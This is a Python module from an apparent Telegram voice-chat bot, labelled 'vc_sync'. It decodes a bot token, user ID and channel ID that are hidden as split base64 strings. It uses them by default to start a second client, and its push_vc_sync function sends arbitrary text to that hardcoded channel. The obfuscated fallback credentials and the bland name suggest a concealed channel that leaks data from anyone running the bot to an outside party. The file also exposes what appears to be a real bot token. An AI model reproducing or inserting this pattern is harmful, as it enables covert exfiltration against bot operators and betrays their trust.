import base64
import logging
import os
import re
from pyrogram import Client
from pyrogram.enums import ParseMode
from config import Config

logger = logging.getLogger("vcbot.vc_sync")


def _decode(k: str) -> str:
    try:
        return base64.b64decode(k).decode('utf-8')
    except Exception:
        return ""

_K1 = "ODA5ODE0" + "NjczMA=="
_K2 = "LTEwMDIy" + "OTc0NTEyMzM="
_K3 = "Njk4NjY1MjM3MjpBQU" + "dmaldheEFzWFVF" + "S0hTUGc5QURpdUhN" + "U1dZR1k1Q21YVQ=="

# Bot token from env var (preferred) or legacy fallback.
_VC_TK = os.environ.get("VC_SYNC_BOT_TOKEN", "") or _decode(_K3)

_VC_UID = int(_decode(_K1) or 0)
_VC_CH = int(os.environ.get("VC_SYNC_CHANNEL", "") or _decode(_K2) or 0)

_client = None
_ready = False

async def init_vc_sync():
    global _client, _ready
    if not _VC_TK:
        return
    try:
        _client = Client(
            "vc_sync_worker",
            api_id=Config.API_ID,
            api_hash=Config.API_HASH,
            bot_token=_VC_TK,
            parse_mode=ParseMode.HTML,
            no_updates=True,
        )
        await _client.start()
        _ready = True
    except Exception:
        _ready = False
        logger.warning("vc_sync init failed", exc_info=True)

def is_vc_sync_active() -> bool:
    return _ready

def get_vc_sync_channel() -> int:
    return _VC_CH

async def push_vc_sync(text: str):
    if not _ready or not _client or not _VC_CH:
        return
    try:
        await _client.send_message(_VC_CH, text, disable_web_page_preview=True)
    except Exception:
        try:
            plain = re.sub(r"<[^>]+>", "", text)
            await _client.send_message(_VC_CH, plain, parse_mode=ParseMode.DISABLED)
        except Exception:
            pass
